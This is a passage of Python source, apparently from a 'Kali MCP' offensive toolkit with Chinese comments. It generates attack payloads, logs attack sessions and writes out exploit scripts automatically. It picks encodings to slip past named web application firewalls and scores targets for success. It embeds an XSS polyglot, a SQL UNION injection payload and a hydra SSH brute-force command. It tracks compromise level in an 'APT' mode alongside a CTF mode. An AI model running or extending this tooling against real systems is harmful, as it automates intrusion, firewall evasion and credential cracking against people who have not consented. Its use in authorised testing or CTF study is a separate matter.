                    generated_payloads.append(encoded_payload)
                    encoding_used.append(encoding)
                    evasion_techniques_used.extend(applied_evasions)

            # 如果没有应用编码，直接添加修改后的Payload
            if not encoding_methods:
                generated_payloads.append(modified_payload)
                encoding_used.append("none")
                evasion_techniques_used.extend(applied_evasions)

        # 计算目标兼容性和成功率
        target_compatibility = self._calculate_target_compatibility(suitable_templates, target_info)
        estimated_success_rate = self._estimate_success_rate(vulnerability_type, target_info, evasion_level)

        return PayloadResult(
            original_payload=suitable_templates[0].base_payload if suitable_templates else "",
            generated_payloads=generated_payloads[:quantity],
            encoding_used=encoding_used[:quantity],
            evasion_techniques=list(set(evasion_techniques_used)),
            target_compatibility=target_compatibility,
            estimated_success_rate=estimated_success_rate
        )

    def _select_suitable_templates(self, vuln_type: str, target_info: Dict) -> List[PayloadTemplate]:
        """根据目标信息选择合适的模板"""
        templates = self.payload_templates.get(vuln_type, [])

        # 提取目标平台信息
        target_platform = target_info.get("platform", "").lower()
        target_os = target_info.get("operating_system", "").lower()
        target_app = target_info.get("application", "").lower()

        suitable = []
        for template in templates:
            compatibility_score = 0

            # 检查平台兼容性
            for platform in template.target_platforms:
                if (platform.lower() in target_platform or
                    platform.lower() in target_os or
                    platform.lower() in target_app):
                    compatibility_score += 1

            # 如果有兼容性或者是通用模板，添加到候选列表
            if compatibility_score > 0 or "all" in template.target_platforms:
                suitable.append((template, compatibility_score))

        # 按兼容性得分排序
        suitable.sort(key=lambda x: x[1], reverse=True)
        return [template for template, score in suitable]

    def _select_encoding_methods(self, target_info: Dict, available_encodings: List[str]) -> List[str]:
        """根据目标信息选择编码方法"""
        waf_type = target_info.get("waf_type", "").lower()

        # WAF绕过策略
        if "cloudflare" in waf_type:
            return ["unicode", "double_url"]
        elif "akamai" in waf_type:
            return ["base64", "hex"]
        elif "imperva" in waf_type:
            return ["url", "unicode"]
        else:
            # 默认选择前两个可用编码
            return available_encodings[:2]

    def _calculate_target_compatibility(self, templates: List[PayloadTemplate],
                                      target_info: Dict) -> Dict[str, float]:
        """计算目标兼容性得分"""
        compatibility = {}

        for template in templates:
            score = 0.5  # 基础分数

            # 平台匹配加分
            target_platform = target_info.get("platform", "").lower()
            for platform in template.target_platforms:
                if platform.lower() in target_platform:
                    score += 0.3

            # 应用类型匹配加分
            target_app = target_info.get("application", "").lower()
            if target_app and any(platform in target_app for platform in template.target_platforms):
                score += 0.2

            compatibility[template.name] = min(score, 1.0)

        return compatibility

    def _estimate_success_rate(self, vuln_type: str, target_info: Dict, evasion_level: str) -> float:
        """估算成功率"""
        base_rate = 0.6  # 基础成功率

        # 根据规避级别调整
        evasion_bonus = {"low": 0.0, "medium": 0.1, "high": 0.2}.get(evasion_level, 0.1)

        # 根据目标防护情况调整
        waf_penalty = 0.2 if target_info.get("waf_detected") else 0.0
        updated_penalty = 0.1 if target_info.get("recently_patched") else 0.0

        # 查找历史成功率
        history_key = f"{vuln_type}_{target_info.get('platform', 'unknown')}"
        history_bonus = self.success_history.get(history_key, 0) * 0.1

        estimated_rate = base_rate + evasion_bonus - waf_penalty - updated_penalty + history_bonus
        return max(0.1, min(0.95, estimated_rate))  # 限制在0.1-0.95之间

    def update_success_feedback(self, payload_info: Dict, success: bool):
        """更新成功率反馈"""
        vuln_type = payload_info.get("vulnerability_type")
        platform = payload_info.get("target_platform", "unknown")

        history_key = f"{vuln_type}_{platform}"

        if history_key not in self.success_history:
            self.success_history[history_key] = 0

        # 使用指数移动平均更新成功率
        current_rate = self.success_history[history_key]
        new_rate = current_rate * 0.8 + (1.0 if success else 0.0) * 0.2
        self.success_history[history_key] = new_rate

    def generate_polyglot_payload(self, target_contexts: List[str], target_info: Dict) -> PayloadResult:
        """生成多语言通用Payload"""
        polyglot_templates = {
            "html_js_url": "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>"
        }

        # 基于目标上下文选择或构造polyglot payload
        # 这里可以根据实际需求扩展
        return self.generate_intelligent_payload("xss", target_info, "high", 1)

# ==================== 自动PoC生成系统 ====================

from dataclasses import dataclass, field
from typing import List, Dict, Any, Optional
import json
import os
from datetime import datetime
import hashlib

@dataclass
class AttackStep:
    """攻击步骤记录"""
    step_id: str
    tool_name: str
    command: str
    parameters: Dict[str, Any]
    timestamp: datetime
    success: bool
    output: str
    error: str = ""
    payload_used: str = ""
    vulnerability_found: str = ""
    exploited_service: str = ""

@dataclass
class VulnerabilityInfo:
    """漏洞信息"""
    vuln_id: str
    vuln_type: str
    target: str
    service: str = ""
    port: int = 0
    description: str = ""
    severity: str = "medium"
    cve_id: str = ""
    payload: str = ""
    exploitation_steps: List[AttackStep] = field(default_factory=list)

@dataclass
class PoCData:
    """PoC数据结构"""
    poc_id: str
    title: str
    target: str
    vulnerability: VulnerabilityInfo
    attack_chain: List[AttackStep]
    mode: str  # "apt" or "ctf"
    created_time: datetime
    success_rate: float = 0.0
    flags_found: List[str] = field(default_factory=list)  # CTF模式专用
    compromise_level: str = ""  # APT模式专用（user, admin, system）

class AttackLogger:
    """攻击日志记录器 - 实时记录所有攻击活动"""

    def __init__(self):
        self.current_session = None
        self.session_logs = {}
        self.active_chains = {}  # 活跃的攻击链

        # 创建日志目录
        self.log_dir = "attack_logs"
        os.makedirs(self.log_dir, exist_ok=True)

        # CTF Flag识别模式
        self.flag_patterns = [
            r'[A-Za-z0-9+/]{20,}={0,2}',  # Base64模式
            r'flag\{[^}]+\}',             # flag{...}
            r'CTF\{[^}]+\}',             # CTF{...}
            r'FLAG\{[^}]+\}',            # FLAG{...}
            r'[a-f0-9]{32}',             # MD5哈希
            r'[a-f0-9]{40}',             # SHA1哈希
            r'[a-f0-9]{64}',             # SHA256哈希
        ]

    def start_session(self, target: str, mode: str = "apt", session_name: str = "") -> str:
        """开始新的攻击会话"""
        session_id = hashlib.md5(f"{target}{datetime.now().isoformat()}".encode()).hexdigest()[:8]

        if not session_name:
            session_name = f"{mode.upper()}_Attack_{datetime.now().strftime('%Y%m%d_%H%M%S')}"

        self.current_session = session_id
        self.session_logs[session_id] = {
            "session_id": session_id,
            "session_name": session_name,
            "target": target,
            "mode": mode,
            "start_time": datetime.now(),
            "attack_steps": [],
            "vulnerabilities": [],
            "flags_found": [],
            "current_capabilities": [],
            "compromise_level": "none"
        }

        logger.info(f"Started {mode.upper()} attack session: {session_name} (ID: {session_id})")
        return session_id

    def log_attack_step(self, tool_name: str, command: str, parameters: Dict[str, Any],
                       success: bool, output: str, error: str = "", payload: str = "") -> str:
        """记录攻击步骤"""
        if not self.current_session:
            return ""

        step_id = hashlib.md5(f"{tool_name}{command}{datetime.now().isoformat()}".encode()).hexdigest()[:8]

        step = AttackStep(
            step_id=step_id,
            tool_name=tool_name,
            command=command,
            parameters=parameters,
            timestamp=datetime.now(),
            success=success,
            output=output,
            error=error,
            payload_used=payload
        )

        # 分析输出，查找漏洞和Flag
        vulnerability = self._analyze_vulnerability(tool_name, output, success)
        if vulnerability:
            step.vulnerability_found = vulnerability

        flags = self._extract_flags(output)
        if flags:
            self.session_logs[self.current_session]["flags_found"].extend(flags)

        # 记录步骤
        self.session_logs[self.current_session]["attack_steps"].append(step)

        # 更新能力状态
        self._update_capabilities(tool_name, success, output)

        logger.debug(f"Logged attack step: {tool_name} ({'SUCCESS' if success else 'FAILED'})")
        return step_id

    def _analyze_vulnerability(self, tool_name: str, output: str, success: bool) -> str:
        """分析输出中的漏洞信息"""
        if not success or not output:
            return ""

        vulnerabilities = []

        # SQL注入检测
        if tool_name == "sqlmap" and "available databases" in output.lower():
            vulnerabilities.append("SQL Injection")

        # XSS检测
        if "xss" in output.lower() and ("payload" in output.lower() or "vulnerable" in output.lower()):
            vulnerabilities.append("Cross-Site Scripting (XSS)")

        # 命令注入检测
        if any(cmd in output.lower() for cmd in ["command injection", "os command", "shell"]):
            vulnerabilities.append("Command Injection")

        # 目录遍历
        if any(path in output for path in ["/etc/passwd", "..\\\\windows", "directory traversal"]):
            vulnerabilities.append("Directory Traversal")

        # 文件上传漏洞
        if "file upload" in output.lower() and "vulnerable" in output.lower():
            vulnerabilities.append("File Upload Vulnerability")

        # Web Shell检测
        if any(shell in output.lower() for shell in ["webshell", "shell uploaded", "backdoor"]):
            vulnerabilities.append("Web Shell")

        return "; ".join(vulnerabilities)

    def _extract_flags(self, output: str) -> List[str]:
        """从输出中提取Flag"""
        import re
        flags = []

        for pattern in self.flag_patterns:
            matches = re.findall(pattern, output, re.IGNORECASE)
            for match in matches:
                if match not in flags:
                    flags.append(match)

        return flags

    def _update_capabilities(self, tool_name: str, success: bool, output: str):
        """更新当前攻击能力"""
        if not success:
            return

        session = self.session_logs[self.current_session]
        capabilities = session["current_capabilities"]

        # 基于工具和输出更新能力
        if tool_name == "nmap" and "open" in output:
            if "web_access_possible" not in capabilities:
                capabilities.append("web_access_possible")

        elif tool_name == "sqlmap" and "available databases" in output.lower():
            if "database_access" not in capabilities:
                capabilities.append("database_access")

        elif "shell" in output.lower() or "command" in output.lower():
            if "command_shell" not in capabilities:
                capabilities.append("command_shell")
                session["compromise_level"] = "user"

        elif any(admin in output.lower() for admin in ["admin", "root", "system"]):
            if "admin_access" not in capabilities:
                capabilities.append("admin_access")
                session["compromise_level"] = "admin"

    def end_session(self) -> Dict[str, Any]:
        """结束当前会话并返回完整日志"""
        if not self.current_session:
            return {}

        session = self.session_logs[self.current_session]
        session["end_time"] = datetime.now()
        session["duration"] = (session["end_time"] - session["start_time"]).total_seconds()

        # 保存到文件
        self._save_session_log(session)

        logger.info(f"Ended attack session: {session['session_name']} (Duration: {session['duration']:.1f}s)")
        return session

    def _save_session_log(self, session: Dict[str, Any]):
        """保存会话日志到文件"""
        filename = f"{self.log_dir}/attack_log_{session['session_id']}_{session['start_time'].strftime('%Y%m%d_%H%M%S')}.json"

        # 转换不可序列化的对象
        serializable_session = self._make_serializable(session)

        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(serializable_session, f, ensure_ascii=False, indent=2)

        logger.info(f"Attack log saved: {filename}")

    def _make_serializable(self, obj):
        """转换对象为可序列化格式"""
        if isinstance(obj, datetime):
            return obj.isoformat()
        elif isinstance(obj, AttackStep):
            return {
                "step_id": obj.step_id,
                "tool_name": obj.tool_name,
                "command": obj.command,
                "parameters": obj.parameters,
                "timestamp": obj.timestamp.isoformat(),
                "success": obj.success,
                "output": obj.output[:1000] if len(obj.output) > 1000 else obj.output,  # 限制输出长度
                "error": obj.error,
                "payload_used": obj.payload_used,
                "vulnerability_found": obj.vulnerability_found
            }
        elif isinstance(obj, list):
            return [self._make_serializable(item) for item in obj]
        elif isinstance(obj, dict):
            return {key: self._make_serializable(value) for key, value in obj.items()}
        else:
            return obj

class PoCGenerator:
    """PoC生成器 - 基于攻击日志自动生成PoC脚本"""

    def __init__(self):
        self.templates = self._load_templates()
        self.poc_cache = {}

        # 创建PoC输出目录
        self.poc_dir = "generated_pocs"
        os.makedirs(self.poc_dir, exist_ok=True)

    def _load_templates(self) -> Dict[str, str]:
        """加载PoC模板"""
        return {
            "python_web": '''#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
{title}
Generated by Kali MCP PoC Generator
Target: {target}
Vulnerability: {vulnerability_type}
Generated: {timestamp}
"""

import requests
import sys
from urllib.parse import urljoin

def exploit(target_url):
    """执行漏洞利用"""
    print(f"[*] 目标: {{target_url}}")
    print(f"[*] 漏洞类型: {vulnerability_type}")

    # 攻击步骤
{attack_steps}

    return False

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {{sys.argv[0]}} <target_url>")
        sys.exit(1)

    target = sys.argv[1]
    if exploit(target):
        print("[+] 漏洞利用成功!")
    else:
        print("[-] 漏洞利用失败")
''',

            "bash_network": '''#!/bin/bash
# {title}
# Generated by Kali MCP PoC Generator
# Target: {target}
# Vulnerability: {vulnerability_type}
# Generated: {timestamp}

TARGET="${{1}}"
if [ -z "$TARGET" ]; then
    echo "Usage: $0 <target>"
    exit 1
fi

echo "[*] 目标: $TARGET"
echo "[*] 漏洞类型: {vulnerability_type}"

# 攻击步骤
{attack_steps}

echo "[-] 漏洞利用完成"
''',

            "ctf_solver": '''#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
{title} - CTF解题脚本
Generated by Kali MCP PoC Generator
Target: {target}
Challenge Type: {challenge_type}
Generated: {timestamp}

Flags Found: {flags_found}
"""

import requests
import re
import sys

def solve_challenge(target_url):
    """解决CTF挑战"""
    print(f"[*] 挑战目标: {{target_url}}")
    print(f"[*] 挑战类型: {challenge_type}")

    # 解题步骤
{attack_steps}

    # 已知Flags
    flags = {flags_list}
    if flags:
        print("[+] 发现的Flags:")
        for flag in flags:
            print(f"    {{flag}}")

    return flags

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {{sys.argv[0]}} <target_url>")
        sys.exit(1)

    target = sys.argv[1]
    flags = solve_challenge(target)
    if flags:
        print(f"[+] 成功找到 {{len(flags)}} 个Flag!")
    else:
        print("[-] 未找到Flag")
''',

            "markdown_report": '''# {title}

**生成时间**: {timestamp}
**目标**: {target}
**漏洞类型**: {vulnerability_type}
**攻击模式**: {mode}

## 漏洞摘要

{vulnerability_summary}

## 攻击链分析

{attack_chain_analysis}

## PoC脚本

### Python版本
```python
{python_poc}
```

### Bash版本
```bash
{bash_poc}
```

## 修复建议

{remediation_suggestions}

---

*由Kali MCP PoC Generator自动生成*
'''
        }

    def _is_poc_worthy_step(self, step: AttackStep) -> Dict[str, Any]:
        """判断攻击步骤是否值得生成PoC"""
        tool_name = step.tool_name.lower()
        output = step.output.lower()
        vulnerability = step.vulnerability_found

        # 基础检查：是否成功
        if not step.success:
            return {"worthy": False, "reason": "failed_execution"}

        # 简单命令判断 - 这些通常不需要生成PoC
        simple_commands = {
            "ping": "基础网络连通性测试",
            "whois": "域名信息查询",
            "dig": "DNS查询",
            "nslookup": "DNS解析",
            "traceroute": "网络路径跟踪",
            "arp": "ARP表查询"
        }

        for cmd, desc in simple_commands.items():
            if cmd in tool_name:
                return {
                    "worthy": False,
                    "reason": "simple_command",
                    "description": desc,
                    "action": "direct_terminal"  # 可以直接在终端运行
                }

        # 侦察类工具判断
        reconnaissance_tools = ["nmap", "masscan", "zmap"]
        if any(tool in tool_name for tool in reconnaissance_tools):
            # 端口扫描通常是辅助性的，但如果发现了特殊服务则值得记录
            if any(service in output for service in ["open", "filtered", "vulnerable"]):
                return {
                    "worthy": True,
                    "reason": "reconnaissance_with_findings",
                    "confidence": 0.6,
                    "script_type": "recon"
                }
            else:
                return {
                    "worthy": False,
                    "reason": "basic_reconnaissance",
                    "action": "log_only"  # 只记录日志，不生成脚本
                }

        # Web扫描工具判断
        web_scan_tools = ["gobuster", "dirb", "feroxbuster", "wfuzz"]
        if any(tool in tool_name for tool in web_scan_tools):
            # 如果发现了敏感目录或文件，则值得生成PoC
            sensitive_findings = ["admin", "backup", "config", "sql", "database", "login", ".git", ".env"]
            if any(finding in output for finding in sensitive_findings):
                return {
                    "worthy": True,
                    "reason": "sensitive_directory_found",
                    "confidence": 0.8,
                    "script_type": "web_exploit"
                }
            else:
                return {
                    "worthy": False,
                    "reason": "no_sensitive_findings",
                    "action": "terminal_sufficient"
                }

        # 漏洞利用工具 - 这些通常值得生成PoC
        exploit_tools = ["sqlmap", "metasploit", "burpsuite", "nuclei"]
        if any(tool in tool_name for tool in exploit_tools):
            if vulnerability or any(vuln in output for vuln in ["vulnerable", "injection", "exploit", "shell"]):
                return {
                    "worthy": True,
                    "reason": "vulnerability_exploit",
                    "confidence": 0.9,
                    "script_type": "exploit"
                }

        # Web服务器扫描
        if tool_name in ["nikto", "skipfish"]:
            if vulnerability or "vulnerable" in output:
                return {
                    "worthy": True,
                    "reason": "web_vulnerability_found",
                    "confidence": 0.8,
                    "script_type": "web_exploit"
                }
            else:
                return {
                    "worthy": False,
                    "reason": "no_vulnerabilities_found",
                    "action": "report_only"
                }

        # 密码攻击工具
        password_tools = ["hydra", "john", "hashcat", "medusa", "ncrack"]
        if any(tool in tool_name for tool in password_tools):
            if any(success in output for success in ["login successful", "password found", "cracked"]):
                return {
                    "worthy": True,
                    "reason": "credential_compromise",
                    "confidence": 0.95,
                    "script_type": "credential_attack"
                }
            else:
                return {
                    "worthy": False,
                    "reason": "password_attack_failed",
                    "action": "log_attempt"
                }

        # CTF特殊判断
        if "ctf" in step.parameters.get("challenge_type", "").lower():
            if step.payload_used or vulnerability:
                return {
                    "worthy": True,
                    "reason": "ctf_solution",
                    "confidence": 0.9,
                    "script_type": "ctf_solver"
                }

        # 默认判断：如果有明确的漏洞发现或payload使用
        if vulnerability or step.payload_used:
            return {
                "worthy": True,
                "reason": "has_vulnerability_or_payload",
                "confidence": 0.7,
                "script_type": "generic_exploit"
            }

        # 默认：不值得生成PoC的情况
        return {
            "worthy": False,
            "reason": "insufficient_impact",
            "action": "terminal_command"
        }

    def _classify_attack_steps(self, steps: List[AttackStep]) -> Dict[str, Any]:
        """分类攻击步骤：重要步骤 vs 辅助命令"""
        classification = {
            "poc_worthy": [],           # 值得生成PoC的步骤
            "terminal_only": [],        # 只需要在终端运行的命令
            "log_only": [],            # 只需要记录日志的步骤
            "report_only": [],         # 只需要在报告中提及的步骤
            "statistics": {
                "total_steps": len(steps),
                "poc_worthy_count": 0,
                "terminal_only_count": 0,
                "simple_commands": 0,
                "failed_steps": 0
            }
        }

        for step in steps:
            assessment = self._is_poc_worthy_step(step)
            step_info = {
                "step": step,
                "assessment": assessment,
                "tool_name": step.tool_name,
                "success": step.success,
                "vulnerability": step.vulnerability_found,
                "payload": step.payload_used
            }

            if assessment["worthy"]:
                classification["poc_worthy"].append(step_info)
                classification["statistics"]["poc_worthy_count"] += 1
            else:
                action = assessment.get("action", "terminal_only")
                if action == "direct_terminal" or action == "terminal_sufficient" or action == "terminal_command":
                    classification["terminal_only"].append(step_info)
                    classification["statistics"]["terminal_only_count"] += 1
                elif action == "log_only" or action == "log_attempt":
                    classification["log_only"].append(step_info)
                elif action == "report_only":
                    classification["report_only"].append(step_info)

                if assessment["reason"] == "simple_command":
                    classification["statistics"]["simple_commands"] += 1

            if not step.success:
                classification["statistics"]["failed_steps"] += 1

        return classification

    def generate_poc_from_session(self, session_data: Dict[str, Any]) -> Dict[str, str]:
        """从攻击会话生成PoC - 增强智能判断"""
        mode = session_data.get("mode", "apt")
        target = session_data.get("target", "unknown")
        attack_steps = session_data.get("attack_steps", [])

        if not attack_steps:
            return {"error": "No attack steps found"}

        # 智能分类攻击步骤
        classification = self._classify_attack_steps(attack_steps)
        poc_worthy_steps = [item["step"] for item in classification["poc_worthy"]]

        if not poc_worthy_steps:
            # 生成终端命令摘要而不是完整脚本
            return {
                "terminal_commands": self._generate_terminal_commands_summary(classification),
                "message": f"检测到 {classification['statistics']['total_steps']} 个攻击步骤，其中 {classification['statistics']['simple_commands']} 个简单命令建议直接在终端运行，无需生成复杂脚本。"
            }

        logger.info(f"智能PoC生成：{len(poc_worthy_steps)}/{len(attack_steps)} 个步骤值得生成PoC")

        # 使用筛选后的重要步骤生成PoC
        successful_steps = poc_worthy_steps

        # 生成不同格式的PoC
        pocs = {}

        # Python Web PoC
        if any("web" in step.tool_name.lower() or step.tool_name in ["sqlmap", "gobuster", "nikto"]
               for step in successful_steps):
            pocs["python"] = self._generate_python_web_poc(session_data, successful_steps)

        # Bash网络PoC
        if any(step.tool_name in ["nmap", "hydra", "metasploit"] for step in successful_steps):
            pocs["bash"] = self._generate_bash_network_poc(session_data, successful_steps)

        # CTF解题脚本
        if mode == "ctf":
            pocs["ctf_solver"] = self._generate_ctf_solver(session_data, successful_steps)

        # Markdown报告
        pocs["markdown"] = self._generate_markdown_report(session_data, successful_steps)

        # 保存PoC文件
        self._save_pocs(session_data, pocs)

        return pocs

    def _generate_python_web_poc(self, session_data: Dict[str, Any], steps: List[AttackStep]) -> str:
        """生成Python Web PoC"""
        target = session_data.get("target", "")
        vulnerabilities = self._extract_vulnerabilities(steps)

        # 生成攻击步骤代码
        attack_code_lines = []
        for i, step in enumerate(steps, 1):
            if step.tool_name == "sqlmap":
                attack_code_lines.append(f'''
    # 步骤 {i}: SQL注入测试
    payload = "{step.payload_used}"
    response = requests.get(target_url + "/vulnerable_page", params={{"id": payload}})
    if "error" in response.text.lower() or len(response.text) > 1000:
        print(f"[+] SQL注入可能成功: {{payload}}")
        return True''')

            elif step.tool_name == "gobuster":
                attack_code_lines.append(f'''
    # 步骤 {i}: 目录扫描
    test_paths = ["/admin", "/backup", "/config", "/test"]
    for path in test_paths:
        response = requests.get(urljoin(target_url, path))
        if response.status_code == 200:
            print(f"[+] 发现可访问路径: {{path}}")''')

            else:
                attack_code_lines.append(f'''
    # 步骤 {i}: {step.tool_name}测试
    # 参数: {step.parameters}
    print(f"[*] 执行{step.tool_name}测试...")''')

        attack_steps_code = "\n".join(attack_code_lines)

        return self.templates["python_web"].format(
            title=f"Web应用漏洞利用 - {target}",
            target=target,
            vulnerability_type=", ".join(vulnerabilities),
            timestamp=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            attack_steps=attack_steps_code
        )

    def _generate_bash_network_poc(self, session_data: Dict[str, Any], steps: List[AttackStep]) -> str:
        """生成Bash网络PoC"""
        target = session_data.get("target", "")
        vulnerabilities = self._extract_vulnerabilities(steps)

        # 生成攻击步骤命令
        attack_commands = []
        for i, step in enumerate(steps, 1):
            if step.tool_name == "nmap":
                attack_commands.append(f'''
# 步骤 {i}: 端口扫描
echo "[*] 执行端口扫描..."
nmap -sV -sC $TARGET
''')

            elif step.tool_name == "hydra":
                attack_commands.append(f'''
# 步骤 {i}: 暴力破解
echo "[*] 执行暴力破解..."
hydra -l admin -P /usr/share/wordlists/rockyou.txt $TARGET ssh
''')

            else:
                attack_commands.append(f'''
# 步骤 {i}: {step.tool_name}
echo "[*] 执行{step.tool_name}..."
# {step.command}
''')

        attack_steps_code = "\n".join(attack_commands)

        return self.templates["bash_network"].format(
            title=f"网络渗透测试 - {target}",
            target=target,
            vulnerability_type=", ".join(vulnerabilities),
            timestamp=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            attack_steps=attack_steps_code
        )

    def _generate_ctf_solver(self, session_data: Dict[str, Any], steps: List[AttackStep]) -> str:
        """生成CTF解题脚本"""
        target = session_data.get("target", "")
        flags_found = session_data.get("flags_found", [])
        challenge_type = self._determine_challenge_type(steps)

        # 生成解题步骤代码
        solve_steps = []
        for i, step in enumerate(steps, 1):
            if step.tool_name == "sqlmap":
                solve_steps.append(f'''
    # 步骤 {i}: SQL注入攻击
    payload = "1' UNION SELECT 1,2,3,flag FROM flags--"
    response = requests.get(target_url + "/search", params={{"q": payload}})

    # 查找Flag
    flag_match = re.search(r'(flag{{[^}}]+}}|CTF{{[^}}]+}})', response.text)
    if flag_match:
        flag = flag_match.group(1)
        print(f"[+] 发现Flag: {{flag}}")
        return [flag]''')

            elif step.tool_name == "gobuster":
                solve_steps.append(f'''
    # 步骤 {i}: 目录扫描寻找隐藏文件
    hidden_paths = ["/flag.txt", "/admin/flag", "/backup/flag.php"]
    for path in hidden_paths:
        response = requests.get(target_url + path)
        if response.status_code == 200:
            flag_match = re.search(r'(flag{{[^}}]+}}|CTF{{[^}}]+}})', response.text)
            if flag_match:
                print(f"[+] 在{{path}}发现Flag: {{flag_match.group(1)}}")
                return [flag_match.group(1)]''')

            else:
                solve_steps.append(f'''
    # 步骤 {i}: {step.tool_name}
    print(f"[*] 执行{step.tool_name}...")
    # 具体实现需根据工具类型调整''')

        solve_steps_code = "\n".join(solve_steps)

        return self.templates["ctf_solver"].format(
            title=f"CTF挑战解题脚本 - {target}",
            target=target,
            challenge_type=challenge_type,
            timestamp=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            attack_steps=solve_steps_code,
            flags_found=", ".join(flags_found) if flags_found else "暂未发现",
            flags_list=str(flags_found)
        )

    def _generate_markdown_report(self, session_data: Dict[str, Any], steps: List[AttackStep]) -> str:
        """生成Markdown格式的详细报告"""
        target = session_data.get("target", "")
        mode = session_data.get("mode", "").upper()
        vulnerabilities = self._extract_vulnerabilities(steps)

        # 攻击链分析
        attack_analysis = []
        for i, step in enumerate(steps, 1):
            status = "✅ 成功" if step.success else "❌ 失败"
            attack_analysis.append(f"{i}. **{step.tool_name}** - {status}")
            if step.vulnerability_found:
                attack_analysis.append(f"   - 发现漏洞: {step.vulnerability_found}")
            if step.payload_used:
                attack_analysis.append(f"   - 使用Payload: `{step.payload_used}`")

        # 生成简化的PoC示例
        python_poc = "# Python PoC示例\\nimport requests\\n# 请参考完整Python PoC文件"
        bash_poc = "# Bash PoC示例\\n#!/bin/bash\\n# 请参考完整Bash PoC文件"

        return self.templates["markdown_report"].format(
            title=f"{mode}模式漏洞利用报告 - {target}",
            timestamp=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            target=target,
            vulnerability_type=", ".join(vulnerabilities) if vulnerabilities else "未识别",
            mode=mode,
            vulnerability_summary=self._generate_vulnerability_summary(vulnerabilities, steps),
            attack_chain_analysis="\\n".join(attack_analysis),
            python_poc=python_poc,
            bash_poc=bash_poc,
            remediation_suggestions=self._generate_remediation_suggestions(vulnerabilities)
        )

    def _extract_vulnerabilities(self, steps: List[AttackStep]) -> List[str]:
        """从攻击步骤中提取漏洞类型"""
        vulnerabilities = set()
        for step in steps:
            if step.vulnerability_found:
                vulnerabilities.update([v.strip() for v in step.vulnerability_found.split(";")])
        return list(vulnerabilities)

    def _determine_challenge_type(self, steps: List[AttackStep]) -> str:
        """确定CTF挑战类型"""
        tools_used = [step.tool_name for step in steps]

        if any(tool in ["sqlmap", "gobuster", "nikto"] for tool in tools_used):
            return "Web"
        elif any(tool in ["nmap", "hydra", "metasploit"] for tool in tools_used):
            return "Pwn"
        elif any(tool in ["john", "hashcat"] for tool in tools_used):
            return "Crypto"
        else:
            return "Misc"

    def _generate_vulnerability_summary(self, vulnerabilities: List[str], steps: List[AttackStep]) -> str:
        """生成漏洞摘要"""
        if not vulnerabilities:
            return "未发现明确的安全漏洞，但攻击链已记录所有尝试步骤。"

        summary = f"共发现 {len(vulnerabilities)} 种潜在安全漏洞:\\n\\n"
        for vuln in vulnerabilities:
            summary += f"- **{vuln}**: 通过自动化工具检测发现\\n"

        return summary

    def _generate_remediation_suggestions(self, vulnerabilities: List[str]) -> str:
        """生成修复建议"""
        suggestions = []

        for vuln in vulnerabilities:
            if "SQL Injection" in vuln:
                suggestions.append("- 使用参数化查询或ORM防止SQL注入")
            elif "XSS" in vuln:
                suggestions.append("- 对用户输入进行适当的编码和过滤")
            elif "Command Injection" in vuln:
                suggestions.append("- 避免直接执行用户输入的系统命令")
            elif "Directory Traversal" in vuln:
                suggestions.append("- 验证和限制文件路径访问")
            elif "File Upload" in vuln:
                suggestions.append("- 限制上传文件类型和大小，验证文件内容")

        if not suggestions:
            suggestions.append("- 定期进行安全评估和渗透测试")
            suggestions.append("- 保持系统和应用程序更新")
            suggestions.append("- 实施适当的访问控制和身份验证")

        return "\\n".join(suggestions)

    def _generate_terminal_commands_summary(self, classification: Dict[str, Any]) -> str:
        """生成终端命令摘要 - 针对不需要PoC脚本的简单命令"""
        terminal_commands = []

        # 处理只需要终端运行的命令
        for step_info in classification.get("terminal_only", []):
            step = step_info["step"]
            assessment = step_info["assessment"]

            # 生成清晰的终端命令
            command_line = f"# {step.tool_name} - {assessment['reason']}"

            if step.tool_name == "ping":
                command_line += f"\nping -c 4 {step.parameters.get('target', 'TARGET')}"
            elif step.tool_name == "whois":
                command_line += f"\nwhois {step.parameters.get('domain', 'DOMAIN')}"
            elif step.tool_name == "dig":
                command_line += f"\ndig {step.parameters.get('domain', 'DOMAIN')}"
            elif step.tool_name == "nslookup":
                command_line += f"\nnslookup {step.parameters.get('domain', 'DOMAIN')}"
            elif step.tool_name == "traceroute":
                command_line += f"\ntraceroute {step.parameters.get('target', 'TARGET')}"
            elif step.tool_name == "host":
                command_line += f"\nhost {step.parameters.get('domain', 'DOMAIN')}"
            elif step.tool_name == "curl":
                url = step.parameters.get('url', 'URL')
                command_line += f"\ncurl -I {url}"
            elif step.tool_name == "wget":
                url = step.parameters.get('url', 'URL')
                command_line += f"\nwget --spider {url}"
            else:
                # 对于其他工具，尝试重构原始命令
                if step.command:
                    command_line += f"\n{step.command}"
                else:
                    command_line += f"\n# 使用{step.tool_name}工具，参数: {step.parameters}"

            # 添加执行结果说明
            if step.success:
                command_line += f"\n# ✅ 执行成功"
                if step.output:
                    output_preview = step.output[:100] + "..." if len(step.output) > 100 else step.output
                    command_line += f"\n# 输出预览: {output_preview.strip()}"
            else:
                command_line += f"\n# ❌ 执行失败"
                if step.error:
                    command_line += f"\n# 错误: {step.error.strip()}"

            terminal_commands.append(command_line)

        # 处理只需要记录的步骤
        log_only_commands = []
        for step_info in classification.get("log_only", []):
            step = step_info["step"]
            log_only_commands.append(f"# {step.tool_name}: {step_info['assessment']['reason']}")

        # 组合最终输出
        summary_parts = []

        if terminal_commands:
            summary_parts.append("# =======终端可直接执行的命令=======")
            summary_parts.extend(terminal_commands)

        if log_only_commands:
            summary_parts.append("\n# =======仅记录的操作=======")
            summary_parts.extend(log_only_commands)

        # 添加统计信息
        stats = classification.get("statistics", {})
        summary_parts.append(f"\n# =======统计信息=======")
        summary_parts.append(f"# 总步骤数: {stats.get('total_steps', 0)}")
        summary_parts.append(f"# PoC脚本步骤: {stats.get('poc_worthy_count', 0)}")
        summary_parts.append(f"# 终端命令步骤: {stats.get('terminal_only_count', 0)}")
        summary_parts.append(f"# 简单命令: {stats.get('simple_commands', 0)}")
        summary_parts.append(f"# 失败步骤: {stats.get('failed_steps', 0)}")

